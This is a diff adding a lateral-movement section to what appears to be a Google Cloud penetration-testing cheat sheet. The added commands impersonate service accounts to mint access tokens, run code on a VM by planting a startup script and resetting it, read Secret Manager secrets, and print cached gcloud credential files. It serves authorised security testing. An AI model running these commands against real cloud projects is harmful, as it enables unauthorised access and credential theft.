@@ -121,6 +121,27 @@ gcloud projects add-iam-policy-binding project-id \
   --role=roles/owner
 ```
 
+### Lateral movement — service-account impersonation
+
+```bash
+# Impersonate a service account you can mint tokens for (needs roles/iam.serviceAccountTokenCreator)
+gcloud auth print-access-token \
+  --impersonate-service-account=<SA>@<PROJECT>.iam.gserviceaccount.com
+# Or call the API directly
+curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+  -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
+  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA>:generateAccessToken"
+
+# Execute on a VM by planting a startup-script, then resetting it
+gcloud compute instances add-metadata <VM> --metadata startup-script='id > /tmp/o'
+gcloud compute instances reset <VM>
+gcloud compute ssh <VM> --tunnel-through-iap                   # if OS Login / project keys allow
+
+# Reuse credentials already on the box — Secret Manager and the cached gcloud config
+gcloud secrets versions access latest --secret=<NAME>
+ls ~/.config/gcloud/ ; cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
+```
+
 ### ScoutSuite for GCP
 
 ```bash
